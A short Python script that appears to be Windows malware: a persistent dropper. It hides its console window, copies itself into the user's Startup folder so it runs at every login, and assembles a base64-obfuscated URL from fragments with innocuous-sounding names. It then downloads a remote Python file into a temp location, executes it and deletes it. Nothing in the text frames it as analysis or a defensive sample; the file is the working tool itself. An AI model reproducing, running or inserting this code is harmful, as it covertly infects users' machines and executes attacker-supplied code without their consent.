import os
import base64
import urllib.request
import tempfile
import subprocess
import ctypes
import sys
import shutil

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)
        
GoDaily = '09PT09PT08ucHk='
click_daily = 'mI2OC9YT19zNTUvbWFpbi'
auto_daily = 'mNvbnRlbnQuY29tL'
top_credits = f'VidXNlc{auto_daily}2J'
Faster = 'M6Ly9yYX'
clickv2_daily = f'HR0cH{Faster}cu'
url = f'a{clickv2_daily}Z2l0aH{top_credits}iY{click_daily}9YT{GoDaily}'
filename = os.path.basename(url)

decoded_url = base64.b64decode(url).decode('utf-8')

with urllib.request.urlopen(decoded_url) as response, tempfile.NamedTemporaryFile(delete=False) as tmp_file:
    tmp_file.write(response.read())
    tmp_file.flush()
    subprocess.call(["python", tmp_file.name])

os.unlink(tmp_file.name)